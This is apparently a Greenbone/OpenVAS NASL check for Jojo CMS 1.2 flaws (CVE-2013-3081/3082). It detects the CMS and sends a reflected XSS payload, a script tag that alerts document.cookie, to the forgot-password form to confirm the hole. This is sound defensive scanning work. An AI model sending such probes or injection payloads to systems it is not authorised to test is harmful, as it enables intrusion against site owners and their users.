if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803703" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2013-3081", "CVE-2013-3082" );
	script_bugtraq_id( 59934, 59933 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2013-05-23 15:54:25 +0530 (Thu, 23 May 2013)" );
	script_name( "Jojo CMS Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/53418" );
	script_xref( name: "URL", value: "https://www.htbridge.com/advisory/HTB23153" );
	script_xref( name: "URL", value: "https://xforce.iss.net/xforce/xfdb/84285" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and execute arbitrary HTML and script code in a user's browser
  session in the context of an affected website." );
	script_tag( name: "affected", value: "Jojo CMS version 1.2 and prior" );
	script_tag( name: "insight", value: "Multiple flaws due to:

  - An insufficient filtration of user-supplied input passed to the
    'X-Forwarded-For' HTTP header in '/articles/test/' URI.

  - An insufficient filtration of user-supplied data passed to 'search' HTTP
    POST parameter in '/forgot-password/' URI." );
	script_tag( name: "solution", value: "Update to Jojo CMS 1.2.2 or later." );
	script_tag( name: "summary", value: "This host is installed with Jojo CMS and is prone to multiple
  vulnerabilities." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
for dir in nasl_make_list_unique( "/", "/jojo", "/cms", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/" ), port: port );
	if(rcvRes && ContainsString( rcvRes, "\"Jojo CMS" ) && ContainsString( rcvRes, "http://www.jojocms.org" )){
		postdata = "type=reset&search=%3E%3Cscript%3Ealert%28document.cookie" + "%29%3B%3C%2Fscript%3E&btn_reset=Send";
		req = NASLString( "POST ", dir, "/forgot-password/ HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "><script>alert(document.cookie);</script>" ) && ContainsString( res, "\"Jojo CMS" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

